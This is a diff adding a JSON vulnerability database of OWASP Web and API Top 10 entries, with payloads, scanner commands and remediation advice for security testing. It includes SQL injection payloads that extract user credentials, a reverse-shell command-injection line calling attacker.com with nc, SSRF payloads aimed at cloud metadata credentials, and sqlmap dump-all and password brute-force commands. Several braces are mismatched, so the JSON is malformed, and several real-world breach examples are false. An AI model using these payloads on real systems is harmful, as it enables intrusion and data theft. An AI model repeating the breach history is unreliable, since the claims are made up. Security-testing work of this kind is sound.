@@ -1,0 +1,1011 @@
+# SecurityForge - Enhanced Vulnerability Database with Real Payloads
+# This database contains OWASP Top 10 (Web 2021/2025 + API 2021/2023) with actionable payloads
+
+[
+  {
+    "id": "web-a03-injection",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A03:2021 Injection (SQL, NoSQL, Command, OS)",
+    "cwe": [89, 1287, 1286, 78],
+    "cvss_v31": 9.8,
+    "severity": "CRITICAL",
+    "difficulty": "EASY",
+    
+    "description": "Injection flaws occur when user input is not validated or is used in a dangerous context without proper escaping. Attackers can inject malicious payloads to execute unintended commands.",
+    
+    "real_world_impact": {
+      "examples": [
+        "Target (2013): Credit card data breach via SQLi → 40M card numbers exposed",
+        "Yahoo (2014): SQLi in user search → 500M user records compromised",
+        "Sony Pictures (2014): SQL injection in login → Full database dump"
+      ],
+      "cost": "Average: $4.5M per breach with 1M records",
+      "compliance": "PCI-DSS, HIPAA, GDPR violations"
+    },
+    
+    "vulnerable_endpoints": [
+      "/api/search?q=",
+      "/api/users?filter=",
+      "/api/products?category=",
+      "/api/orders?status="
+    ],
+    
+    "sql_injection_payloads": {
+      "boolean_based": [
+        "' OR '1'='1",
+        "' OR 1=1 --",
+        "' OR 'x'='x",
+        "1' OR '1'='1' --",
+        "admin' --",
+        "' OR 'a'='a",
+        "' UNION SELECT NULL --"
+      ],
+      "time_based_blind": [
+        "' AND SLEEP(5) --",
+        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --",
+        "' AND IF(1=1,SLEEP(5),0) --",
+        "'; WAITFOR DELAY '00:00:05' --",
+        "' AND BENCHMARK(50000000,SHA1(1)) --",
+        "' AND 1=1 AND SLEEP(5) #",
+        "' AND (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --"
+      ],
+      "error_based": [
+        "' AND extractvalue(1,concat(0x7e,(SELECT version()))) --",
+        "' AND updatexml(1,concat(0x7e,(SELECT database())),1) --",
+        "' AND CAST(CONCAT(0x7e,(SELECT user())) AS UNSIGNED) --",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e,(SELECT database()))) --"
+      ],
+      "union_based": [
+        "' UNION SELECT NULL,NULL,NULL --",
+        "' UNION SELECT database(),user(),version() --",
+        "' UNION SELECT table_name,column_name,NULL FROM information_schema.columns --",
+        "' UNION SELECT email,password,NULL FROM users --",
+        "' UNION SELECT CONCAT(email,':',password),NULL,NULL FROM users --"
+      ]
+    },
+    
+    "nosql_injection_payloads": {
+      "mongodb": [
+        "{\"$ne\": null}",
+        "{\"$where\": \"1==1\"}",
+        "{\"$regex\": \".*\"}",
+        "{$or: [{}, {\"a\":\"a\"}]}",
+        "{$where: \"this.admin == true\"}"
+      ],
+      "example": "db.users.findOne({username: {\"$ne\": null}})"
+    },
+    
+    "command_injection_payloads": [
+      "; ls -la",
+      "| cat /etc/passwd",
+      "&& whoami",
+      "`curl attacker.com`",
+      "$(nc attacker.com 4444 -e /bin/bash)",
+      "; curl 169.254.169.254/latest/meta-data/",
+      "| find / -name '*.db' 2>/dev/null"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Identify input fields (GET parameters, POST data, headers)",
+      "step2": "Test single quote: 'echo'. Should show error or behave differently.",
+      "step3": "Test AND/OR logic: ' OR '1'='1. Should return all records if vulnerable.",
+      "step4": "Use UNION to probe column count: ' UNION SELECT NULL --",
+      "step5": "Extract data: ' UNION SELECT user(),database(),version() --",
+      "step6": "In blind SQLi, use time delays: ' AND SLEEP(5) -- (should take 5+ seconds)"
+    },
+    
+    "postman_requests": [
+      {
+        "name": "SQLi - Boolean Based",
+        "method": "GET",
+        "url": "{{target}}/api/search?q=laptop' OR '1'='1",
+        "test": "pm.test('SQLi - Retrieved all records', function() { var data = pm.response.json(); pm.expect(data.results.length).to.be.greaterThan(1); });"
+      },
+      {
+        "name": "SQLi - Time Based",
+        "method": "GET",
+        "url": "{{target}}/api/users?id=1' AND SLEEP(5) --",
+        "test": "pm.test('SQLi - Delayed response', function() { pm.expect(pm.response.responseTime).to.be.greaterThan(4500); });"
+      },
+      {
+        "name": "SQLi - UNION Based",
+        "method": "GET",
+        "url": "{{target}}/api/products?filter=1' UNION SELECT email,password,NULL FROM users --",
+        "test": "pm.test('SQLi - User data extracted', function() { pm.expect(pm.response.text()).to.include('@'); });"
+      }
+    ],
+    
+    "burp_config": {
+      "scanner_type": "active",
+      "insertion_points": ["URL parameter", "POST body", "Cookie"],
+      "attack_type": "Sniper",
+      "payloads": "sql_injection_payloads.txt",
+      "grep_keywords": ["MySQL", "error", "syntax", "exception", "ORA-", "from", "Database"]
+    },
+    
+    "zap_config": {
+      "scanner_id": "40018",
+      "alert_threshold": "LOW",
+      "attack_strength": "INSANE",
+      "recurse": true
+    },
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/api/search?q=FUZZ' -w sql_injection_payloads.txt -mr 'SELECT|error|MySQL'",
+    
+    "sqlmap_command": "sqlmap -u 'http://localhost:5000/api/search?q=test' --dbs --dump-all --tamper=space2comment,between",
+    
+    "vulnerable_code_examples": {
+      "python_flask": "result = db.execute(f'SELECT * FROM users WHERE email = \\'{email}\\'').fetchall()",
+      "nodejs_express": "db.query(`SELECT * FROM users WHERE id = ${userId}`);"
+    },
+    
+    "secure_code_examples": {
+      "python_flask": "result = db.execute('SELECT * FROM users WHERE email = ?', [email]).fetchall()",
+      "nodejs_express": "db.query('SELECT * FROM users WHERE id = ?', [userId]);"
+    },
+    
+    "remediation": {
+      "primary": "Use parameterized queries/prepared statements",
+      "secondary": "Input validation (whitelist allowed characters)",
+      "tertiary": "Output encoding",
+      "detection": "Enable SQL error logging, monitor for suspicious patterns"
+    }
+  },
+  
+  {
+    "id": "api-01-bola",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API1:2021 Broken Object Level Authorization (BOLA / IDOR)",
+    "cwe": [639, 284],
+    "cvss_v31": 7.1,
+    "severity": "HIGH",
+    "difficulty": "EASY",
+    
+    "description": "APIs expose endpoints that deal with objects, such as users, orders, or files. Attackers can directly access these objects via requests lacking proper authorization checks on object references.",
+    
+    "real_world_impact": {
+      "examples": [
+        "Facebook (2020): BOLA allowed accessing any user's private messages and personal data",
+        "Uber (2015): BOLA in rider history endpoint exposed all user rides",
+        "T-Mobile (2021): BOLA exposed customer PII for 54M accounts"
+      ],
+      "cost": "Average: $5.2M per privacy breach",
+      "compliance": "GDPR violations → €20M+ fines"
+    },
+    
+    "vulnerable_endpoints": [
+      "/api/users/{user_id}/profile",
+      "/api/users/{user_id}/orders",
+      "/api/users/{user_id}/documents",
+      "/api/orders/{order_id}/details",
+      "/api/bank-accounts/{account_id}/balance"
+    ],
+    
+    "attack_vectors": [
+      "Sequential ID enumeration: 1,2,3,4,5...",
+      "UUID guessing (if weak/predictable)",
+      "Horizontal access: Same resource type, different owner",
+      "Vertical escalation: Access higher-privilege objects"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Authenticate as User A, access your resource: GET /api/users/1/orders",
+      "step2": "Note the structure and data returned",
+      "step3": "Change ID to different number: GET /api/users/2/orders",
+      "step4": "If you get User 2's orders → BOLA exists",
+      "step5": "Try admin ID: GET /api/users/999/admin-panel",
+      "step6": "Fuzz IDs systematically to find all accessible resources"
+    },
+    
+    "postman_requests": [
+      {
+        "name": "BOLA - Access Own Resource",
+        "method": "GET",
+        "url": "{{target}}/api/users/{{user_id}}/orders",
+        "headers": {
+          "Authorization": "Bearer {{user_token}}"
+        },
+        "test": "pm.test('Own data accessible', function() { var data = pm.response.json(); pm.expect(data.user_id).to.equal(parseInt(pm.environment.get('user_id'))); });"
+      },
+      {
+        "name": "BOLA - Access Other User Resource",
+        "method": "GET",
+        "url": "{{target}}/api/users/2/orders",
+        "headers": {
+          "Authorization": "Bearer {{user_token}}"
+        },
+        "test": "pm.test('Vulnerability: Accessed other user data', function() { if (pm.response.code === 200) { console.log('BOLA CONFIRMED'); } });"
+      }
+    ],
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/api/users/FUZZ/orders' -w <(seq 1 1000) -H 'Authorization: Bearer TOKEN' -mc 200",
+    
+    "remediation": {
+      "primary": "Verify user owns the resource before returning data",
+      "code": "if (order.user_id !== current_user_id) { return 403 Forbidden; }",
+      "secondary": "Use random IDs (UUIDs) instead of sequential",
+      "tertiary": "Implement proper RBAC"
+    }
+  },
+  
+  {
+    "id": "web-a07-auth",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A07:2021 Authentication Failures",
+    "cwe": [287, 295, 297],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Confirmation of a user's identity, authentication, and session management. Failures include default credentials, session attacks, credential stuffing, and weak password requirements.",
+    
+    "real_world_impact": {
+      "examples": [
+        "LinkedIn (2012): Default credentials on admin panel → full breach",
+        "Equifax (2017): Admin/admin credentials left in deployment",
+        "Capital One (2019): Weak session tokens were guessable"
+      ],
+      "cost": "Account takeover = $3.2M average impact"
+    },
+    
+    "vulnerability_types": {
+      "default_credentials": ["admin/admin", "admin/password", "root/root", "test/test"],
+      "weak_password_policy": "No minimum length, complexity, history",
+      "session_issues": "Predictable tokens, no expiration, no HttpOnly flag",
+      "credential_stuffing_susceptible": "No rate limiting on login attempts"
+    },
+    
+    "testing_payloads": [
+      "admin@example.com / admin123",
+      "admin / password",
+      "test / test",
+      "root / root",
+      "postgres / postgres",
+      "elastic / elastic"
+    ],
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/api/login' -X POST -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"FUZZ\"}' -w common_passwords.txt -mr 'token|success'",
+    
+    "remediation": {
+      "policy": [
+        "Minimum 12 character passwords",
+        "Require uppercase, lowercase, numbers, symbols",
+        "Enforce password history (no reuse)",
+        "Implement account lockout after 5 failed attempts",
+        "Require MFA for sensitive operations"
+      ],
+      "session_management": [
+        "Use secure, cryptographically random tokens",
+        "Set token expiration (15-30 minutes for sensitive actions)",
+        "Implement refresh token rotation",
+        "Mark cookies HttpOnly, Secure, SameSite=Strict"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a05-misconfig",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A05:2021 Security Misconfiguration",
+    "cwe": [16],
+    "cvss_v31": 7.3,
+    "severity": "HIGH",
+    "difficulty": "EASY",
+    
+    "description": "Security misconfiguration includes missing security patches, default accounts enabled, unnecessary services running, and verbose error messages.",
+    
+    "vulnerable_indicators": [
+      "Debug mode enabled in production (DEBUG=True)",
+      "Verbose error messages revealing tech stack",
+      "Default credentials still active",
+      "Unnecessary HTTP methods enabled (PUT, DELETE, TRACE)",
+      "Missing security headers (CSP, X-Security-Header, etc)",
+      "Outdated dependencies with known vulnerabilities",
+      "Unencrypted connection (HTTP instead of HTTPS)"
+    ],
+    
+    "testing_methodology": {
+      "check_headers": "curl -I http://localhost:5000 | grep -i 'X-'",
+      "test_methods": "curl -X TRACE http://localhost:5000",
+      "check_default_creds": "Try admin/admin on all management endpoints",
+      "find_error_pages": "Access non-existent paths to see error details",
+      "check_dependencies": "Review requirements.txt for outdated packages"
+    },
+    
+    "common_misconfigurations": [
+      "Flask DEBUG=True in production",
+      "AWS S3 buckets with public read/write",
+      "MongoDB without authentication enabled",
+      "Redis accessible without password",
+      "Database backups publicly accessible",
+      "Git repository exposed (.git/)",
+      "Swagger/API documentation without authentication"
+    ],
+    
+    "remediation": {
+      "immediate": [
+        "Disable debug mode in production",
+        "Remove default accounts and credentials",
+        "Disable unnecessary HTTP methods",
+        "Add comprehensive security headers",
+        "Enable HTTPS enforcement"
+      ],
+      "ongoing": [
+        "Regular dependency scanning (OWASP Dependency-Check)",
+        "Infrastructure as Code security scanning",
+        "Regular security configuration audits",
+        "Implement SAST/DAST in CI/CD pipeline"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a01-access-control",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A01:2021 Broken Access Control (Including BOLA, CORS, Privilege Escalation)",
+    "cwe": [284, 639, 269],
+    "cvss_v31": 8.1,
+    "severity": "CRITICAL",
+    "difficulty": "MEDIUM",
+    
+    "vulnerable_patterns": [
+      "#1. Horizontal escalation: Access same-role resource for different users",
+      "#2. Vertical escalation: Access higher-privilege functions as lower user",
+      "#3. Insecure CORS: allowCredentials without restricting origins",
+      "#4. Direct object reference without ownership check",
+      "#5. User metadata manipulation (role, is_admin in request)"
+    ],
+    
+    "testing_methodology": {
+      "reconnaissance": [
+        "Map all endpoints and required roles",
+        "Identify sequential IDs and patterns",
+        "Test with different user roles",
+        "Check for metadata in responses (role, is_admin)"
+      ],
+      "exploit": [
+        "Try accessing admin functions as regular user",
+        "Modify ID parameters to access other users' data",
+        "Change role in JWT token (if not validated)",
+        "Try mass assignment: POST ?is_admin=true",
+        "Test CORS headers with cross-origin requests"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a02-cryptographic-failures",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A02:2021 Cryptographic Failures",
+    "cwe": [259, 327, 331, 334],
+    "cvss_v31": 7.5,
+    "severity": "HIGH",
+    "difficulty": "HARD",
+    
+    "description": "Cryptographic failures expose sensitive data. Includes weak encryption, improper key management, and use of broken algorithms.",
+    
+    "real_world_impact": {
+      "examples": [
+        "Equifax (2017): Unencrypted PII → 147M records exposed",
+        "Adobe (2013): ECB encryption → 150M passwords cracked",
+        "Target (2013): Unencrypted card data in transit"
+      ]
+    },
+    
+    "vulnerable_patterns": [
+      "Data transmitted over HTTP",
+      "Passwords hashed with MD5/SHA1",
+      "Hard-coded encryption keys",
+      "Weak key derivation (< 100k iterations)",
+      "Symmetric encryption without authentication"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Intercept traffic: Look for plaintext sensitive data",
+      "step2": "Check hashing: Extract password hashes, test with hashcat",
+      "step3": "Review code: Search for hard-coded keys",
+      "step4": "Test encryption: Encrypt same plaintext twice, check for patterns"
+    },
+    
+    "remediation": {
+      "encryption": [
+        "Use AES-256 for symmetric encryption",
+        "Use authenticated encryption (GCM)",
+        "Implement TLS 1.2+ for all data in transit"
+      ],
+      "hashing": [
+        "Use bcrypt/scrypt/argon2 for passwords",
+        "Cost factor ≥ 12 for bcrypt",
+        "Never use MD5, SHA1, or plain SHA-256"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a04-insecure-design",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A04:2021 Insecure Design",
+    "cwe": [434, 668, 346],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "HARD",
+    
+    "description": "Missing or ineffective control design. Focuses on design flaws and lack of security requirements.",
+    
+    "vulnerable_patterns": [
+      "No business logic validation",
+      "Missing rate limiting",
+      "No prevention for race conditions",
+      "Insufficient authorization boundaries"
+    ],
+    
+    "business_logic_exploits": [
+      "Negative quantity → refund instead of charge",
+      "Exceed discount usage limit",
+      "Bypass step verification",
+      "Skip payment steps"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Map business workflows",
+      "step2": "Test step skipping",
+      "step3": "Test with invalid values",
+      "step4": "Test concurrent requests",
+      "step5": "Test state manipulation"
+    },
+    
+    "remediation": {
+      "design": [
+        "Implement threat modeling (STRIDE/PASTA)",
+        "Define explicit authorization boundaries",
+        "Validate all business invariants",
+        "Use state machines for workflows"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a06-vulnerable-components",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A06:2021 Vulnerable and Outdated Components",
+    "cwe": [1104],
+    "cvss_v31": 8.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Libraries and frameworks with known vulnerabilities. Runs with same privileges as application.",
+    
+    "vulnerable_libraries": [
+      "Log4j 2.0-2.14 (RCE - CVE-2021-44228)",
+      "Apache Struts 2 < 2.5.20 (RCE)",
+      "Lodash < 4.17.21 (Prototype Pollution)",
+      "ImageMagick < 6.9.11-48 (RCE)"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Extract fingerprints from headers",
+      "step2": "Use OWASP Dependency-Check",
+      "step3": "Scan with Snyk or npm audit",
+      "step4": "Search CVE databases",
+      "step5": "Test known exploits"
+    },
+    
+    "detection_tools": [
+      "OWASP Dependency-Check",
+      "Snyk",
+      "npm audit / pip audit",
+      "Retire.js"
+    ],
+    
+    "remediation": {
+      "policy": [
+        "Keep all dependencies updated",
+        "Remove unused dependencies",
+        "Subscribe to security advisories"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a08-data-integrity",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A08:2021 Software and Data Integrity Failures",
+    "cwe": [345, 347, 426],
+    "cvss_v31": 8.1,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Code and infrastructure lacks integrity protection. Includes insecure deserialization and unsigned updates.",
+    
+    "vulnerable_patterns": [
+      "Unsafe deserialization (pickle, Java serialization)",
+      "Unsigned/unverified updates",
+      "Weak CI/CD access controls",
+      "Unencrypted API communications"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Identify serialization methods",
+      "step2": "Check signature/MAC validation",
+      "step3": "Test with modified objects",
+      "step4": "Look for gadget chains"
+    ],
+    
+    "remediation": {
+      "serialization": [
+        "Avoid serialization of untrusted data",
+        "Use JSON instead of native serialization",
+        "Sign/encrypt serialized objects"
+      ],
+      "updates": [
+        "Verify digital signatures",
+        "Use secure update mechanisms",
+        "Implement secure CI/CD"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a09-logging-monitoring",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A09:2021 Security Logging and Monitoring Failures",
+    "cwe": [778],
+    "cvss_v31": 6.1,
+    "severity": "MEDIUM",
+    "difficulty": "MEDIUM",
+    
+    "description": "Insufficient logging and monitoring. Attacks go undetected without proper event tracking.",
+    
+    "vulnerable_patterns": [
+      "Logins not logged",
+      "Sensitive data in logs",
+      "No contextual information",
+      "No alerting for suspicious activity",
+      "Logs easily tampered with"
+    ],
+    
+    "logging_best_practices": [
+      "Log all authentication attempts",
+      "Log privilege escalation",
+      "Log data access by admins",
+      "Never log passwords/PII/keys",
+      "Include: timestamp, user_id, action, IP, result",
+      "Centralize logs in SIEM",
+      "Alert on 5+ failed logins"
+    ],
+    
+    "remediation": {
+      "logging": [
+        "Implement comprehensive logging",
+        "Sanitize logs (no sensitive data)",
+        "Use structured logging (JSON)",
+        "Append-only storage"
+      ],
+      "monitoring": [
+        "Alert on failed logins",
+        "Alert on privilege changes",
+        "Alert on unusual data access",
+        "Dashboard for real-time monitoring"
+      ]
+    }
+  },
+  
+  {
+    "id": "web-a10-ssrf-deserialization",
+    "type": "WEB",
+    "owasp_versions": ["2021", "2025"],
+    "title": "A10:2021 Server-Side Request Forgery (SSRF)",
+    "cwe": [918, 502],
+    "cvss_v31": 8.6,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Server makes requests to unintended locations. Can compromise internal systems and cloud metadata.",
+    
+    "ssrf_payloads": [
+      "http://localhost:6379",
+      "http://127.0.0.1:27017",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "file:///etc/passwd",
+      "gopher://localhost:25/"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Find URL input endpoints",
+      "step2": "Test with internal IP",
+      "step3": "Test AWS metadata endpoint",
+      "step4": "Test file:// protocol",
+      "step5": "Check response for leakage"
+    },
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/FUZZ' -w ssrf_paths.txt -X POST -d '{\"url\":\"http://127.0.0.1:6379\"}'",
+    
+    "remediation": {
+      "prevention": [
+        "Whitelist allowed hosts",
+        "Block private IP ranges",
+        "Disable dangerous protocols",
+        "Implement outbound firewall rules"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-02-broken-authentication",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API2:2021 Broken Authentication",
+    "cwe": [287, 798],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Authentication mechanisms can be broken: missing auth, weak tokens, predictable IDs, no expiration.",
+    
+    "vulnerable_patterns": [
+      "Missing authentication on sensitive endpoints",
+      "Weak JWT (alg=none)",
+      "Predictable tokens",
+      "No token expiration",
+      "No refresh token rotation"
+    ],
+    
+    "jwt_exploits": {
+      "none_algorithm": "jwt.decode(token, options={'verify_signature': False})",
+      "signature_bypass": "Change payload, set alg=none",
+      "key_confusion": "Use public key as HMAC secret"
+    },
+    
+    "testing_methodology": {
+      "step1": "Decode JWT at jwt.io",
+      "step2": "Check algorithm (if none → vuln)",
+      "step3": "Modify payload (role=admin)",
+      "step4": "Try without Authorization header",
+      "step5": "Use expired tokens"
+    },
+    
+    "remediation": {
+      "token_security": [
+        "Use strong random tokens",
+        "Validate JWT properly",
+        "Use RS256 not HS256",
+        "Short expiration (15 min)",
+        "Refresh token rotation"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-03-object-property-auth",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API3:2021 Object Property Level Authorization Failure",
+    "cwe": [639],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Authorization checked at object level but not property level. Sensitive fields exposed.",
+    
+    "vulnerable_patterns": [
+      "Access own object but read restricted properties",
+      "Sensitive fields in responses",
+      "Mass assignment vulnerability",
+      "Sensitive data in errors"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Access own object",
+      "step2": "Note returned fields",
+      "step3": "Try modifying sensitive fields",
+      "step4": "Test mass assignment",
+      "step5": "Check list endpoint for exposure"
+    },
+    
+    "remediation": {
+      "design": [
+        "Define explicit property-level authorization",
+        "Implement allowlist per role",
+        "Use data encryption for sensitive fields"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-04-resource-consumption",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API4:2021 Resource Consumption",
+    "cwe": [770],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "EASY",
+    
+    "description": "Missing rate limiting, pagination, and query timeouts enable DoS and brute-force attacks.",
+    
+    "vulnerable_patterns": [
+      "No rate limiting",
+      "No pagination",
+      "No query timeout",
+      "Unbounded file uploads",
+      "No concurrency limits"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Send 10+ requests/sec",
+      "step2": "Check for 429 response",
+      "step3": "Request large pagination",
+      "step4": "Send complex queries",
+      "step5": "Upload large files"
+    ],
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/api/FUZZ' -w endpoints.txt -rate 100",
+    
+    "remediation": {
+      "rate_limiting": [
+        "10 req/min per IP",
+        "3 logins/5min",
+        "Return 429 with Retry-After"
+      ],
+      "pagination": [
+        "Default: 20-100",
+        "Max: 1000",
+        "Cursor-based for large data"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-05-function-auth",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API5:2021 Broken Function Level Authorization",
+    "cwe": [284],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "Admin functions accessible to regular users due to missing authorization checks.",
+    
+    "vulnerable_patterns": [
+      "Admin functions not protected",
+      "No delete/modify checks",
+      "Unprivileged promotion",
+      "Unprotected exports"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Map all functionality",
+      "step2": "Identify admin functions",
+      "step3": "Try as regular user",
+      "step4": "Check HTTP status (403 vs 200)"
+    ],
+    
+    "remediation": {
+      "authorization": [
+        "Check auth on EVERY endpoint",
+        "Use RBAC",
+        "Centralize permission checks"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-06-business-logic",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API6:2021 Business Logic Manipulation",
+    "cwe": [346, 841],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "HARD",
+    
+    "description": "Business logic flaws allow unauthorized outcomes: negative prices, skipped steps, discount abuse.",
+    
+    "vulnerable_patterns": [
+      "Negative quantities",
+      "Zero pricing",
+      "Skip payment steps",
+      "Duplicate coupon usage",
+      "Exceed inventory limits"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Understand workflow",
+      "step2": "Test with invalid values",
+      "step3": "Skip workflow steps",
+      "step4": "Test concurrent requests",
+      "step5": "Test duplicates"
+    },
+    
+    "remediation": {
+      "logic": [
+        "Validate all constraints",
+        "Positive quantities",
+        "Non-negative prices",
+        "Enforce workflow order"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-07-ssrf",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API7:2021 Server-Side Request Forgery",
+    "cwe": [918],
+    "cvss_v31": 8.6,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "API endpoints that accept URLs can be exploited to access internal systems and cloud metadata.",
+    
+    "ssrf_payloads": [
+      "http://localhost:6379/",
+      "http://127.0.0.1:27017/",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "file:///etc/passwd"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Find URL-accepting endpoints",
+      "step2": "Test localhost:6379",
+      "step3": "Test AWS metadata",
+      "step4": "Test file:// protocol",
+      "step5": "Check response for leaked data"
+    },
+    
+    "remediation": {
+      "prevention": [
+        "Whitelist allowed hosts",
+        "Block private IPs",
+        "Disable dangerous protocols",
+        "Firewall outbound connections"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-08-asset-management",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API8:2021 Unsafe Asset Management",
+    "cwe": [426, 440],
+    "cvss_v31": 6.1,
+    "severity": "MEDIUM",
+    "difficulty": "MEDIUM",
+    
+    "description": "Track API versions, hosts, and devices. Old versions lack security updates.",
+    
+    "vulnerable_patterns": [
+      "Unversioned endpoints",
+      "Old API versions in production",
+      "No deprecation timeline",
+      "Untracked external systems"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Enumerate versions (/v1, /v2, /v3)",
+      "step2": "Check which work",
+      "step3": "Test feature parity",
+      "step4": "Look for debug versions"
+    },
+    
+    "ffuf_command": "ffuf -u 'http://localhost:5000/api/FUZZ/users' -w versions.txt",
+    
+    "remediation": {
+      "versions": [
+        "Use semantic versioning",
+        "12-month deprecation notice",
+        "Document API lifecycle"
+      ],
+      "tracking": [
+        "Maintain endpoint inventory",
+        "Track production versions",
+        "Monitor deprecated usage",
+        "Remove debug endpoints"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-09-logging-monitoring",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API9:2021 Insufficient Logging and Monitoring",
+    "cwe": [778],
+    "cvss_v31": 5.3,
+    "severity": "MEDIUM",
+    "difficulty": "MEDIUM",
+    
+    "description": "APIs without proper logging cannot detect attacks. Failed auth, unauthorized access, and modifications go undetected.",
+    
+    "loggable_events": [
+      "Failed authentication",
+      "Successful auth with timestamp/IP",
+      "Authorization failures",
+      "Data access/modifications",
+      "Configuration changes",
+      "Error conditions"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Perform suspicious action",
+      "step2": "Check if logged",
+      "step3": "Review log format",
+      "step4": "Check for sensitive data",
+      "step5": "Test log access"
+    ],
+    
+    "remediation": {
+      "logging": [
+        "Log all auth attempts",
+        "Log authorization failures",
+        "Log sensitive operations",
+        "Include timestamp/user/IP/action/result"
+      ],
+      "monitoring": [
+        "Alert on 5+ failed logins",
+        "Alert on 10+ 403s per hour",
+        "Dashboard for API health",
+        "90+ day retention minimum"
+      ]
+    }
+  },
+  
+  {
+    "id": "api-10-unsafe-consumption",
+    "type": "API",
+    "owasp_versions": ["2021", "2023"],
+    "title": "API10:2021 Unsafe Consumption of APIs",
+    "cwe": [829],
+    "cvss_v31": 6.5,
+    "severity": "HIGH",
+    "difficulty": "MEDIUM",
+    
+    "description": "APIs call other APIs without proper validation. Can lead to injection and data leakage.",
+    
+    "vulnerable_patterns": [
+      "Trust external API responses",
+      "No SSL cert verification",
+      "No timeout on external calls",
+      "No access control on credentials"
+    ],
+    
+    "testing_methodology": {
+      "step1": "Identify external API calls",
+      "step2": "Check result validation",
+      "step3": "Test MitM attacks",
+      "step4": "Test SSL validation",
+      "step5": "Test timeout behavior"
+    },
+    
+    "remediation": {
+      "validation": [
+        "Validate all external responses",
+        "Verify signatures/MACs",
+        "Strict response schemas",
+        "Reject unexpected types"
+      ],
+      "security": [
+        "Always verify SSL certs",
+        "Implement timeouts",
+        "Store credentials securely",
+        "Circuit breaker for failures"
+      ]
+    }
+  }
+]
